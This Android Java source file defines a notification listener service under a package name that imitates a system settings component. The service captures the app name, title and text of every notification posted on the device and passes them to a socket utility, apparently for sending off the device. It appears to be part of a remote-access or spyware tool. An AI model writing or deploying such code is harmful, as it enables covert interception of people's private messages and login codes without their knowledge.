package com.android.data.settings.Service;

import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.v4.content.LocalBroadcastManager;

import com.android.data.settings.Utility.SocketUtil;


public class NotificationService extends NotificationListenerService {

    public static boolean isNotificationListenerConnected = false;
    public static final String MS_NOTIFICATION_MESSAGE = "MS_Notification_Message";
    public static final String INTENT_NOTIFY_PACKAGE = "Notification_Package";
    public static final String INTENT_NOTIFY_TICKER = "Notification_Ticker";
    public static final String INTENT_NOTIFY_TITLE = "Notification_Title";
    public static final String INTENT_NOTIFY_TEXT = "Notification_Text";

    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = this;
    }

    @Override
    public void onListenerConnected() {
        isNotificationListenerConnected = true;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        Notification notification = sbn.getNotification();
        if(notification != null) {
            String tickerText = null, title = null, text = null;

            String pkg = sbn.getPackageName();
            CharSequence ticker = notification.tickerText;
            if(ticker != null) tickerText = ticker.toString();

            Bundle extras = notification.extras;
            if(extras != null) {
                title = extras.getString("android.title", "");
                text = extras.getCharSequence("android.text", "No Message").toString();
            }

            Intent intent = new Intent(SocketUtil.INTENT_CAM_SERVICE_UPDATES);
            intent.putExtra(SocketUtil.INTENT_CS_TYPE, SocketUtil.INTENT_TYPE_NOTIFICATION);
            intent.putExtra(INTENT_NOTIFY_PACKAGE, pkg);
            intent.putExtra(INTENT_NOTIFY_TICKER, tickerText);
            intent.putExtra(INTENT_NOTIFY_TITLE, title);
            intent.putExtra(INTENT_NOTIFY_TEXT, text);

            LocalBroadcastManager.getInstance(context).sendBroadcast(intent);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }

    @Override
    public void onListenerDisconnected() {
        isNotificationListenerConnected = false;
    }
}


